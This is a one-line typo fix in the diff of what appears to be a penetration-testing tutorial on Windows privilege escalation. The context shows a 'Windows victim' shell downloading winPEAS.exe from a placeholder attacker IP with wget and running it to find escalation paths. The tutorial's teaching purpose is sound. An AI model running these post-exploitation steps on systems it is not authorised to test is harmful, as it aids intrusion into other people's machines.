@@ -44,7 +44,7 @@ Once you have transferd one of the files you can run it and read the output care
 Let's say we already have shell on a Windows victim we could start from there to download the winPEAS.exe file with the command below
 <div class="alert-info">wget http://ip/winPEAS.exe -O winPEAS.exe</div>
 ![image](/assets/img/tranfser-winpeas.png)  
-As you can see the shell we had does not understand weget. So we just type in powershell to get a powershell shell were we can run the wget command.
+As you can see the shell we had does not understand wget. So we just type in powershell to get a powershell shell were we can run the wget command.
 
 Next run the winPEAS.exe and check for anything interesting that could lead to a privilege escalation.
 
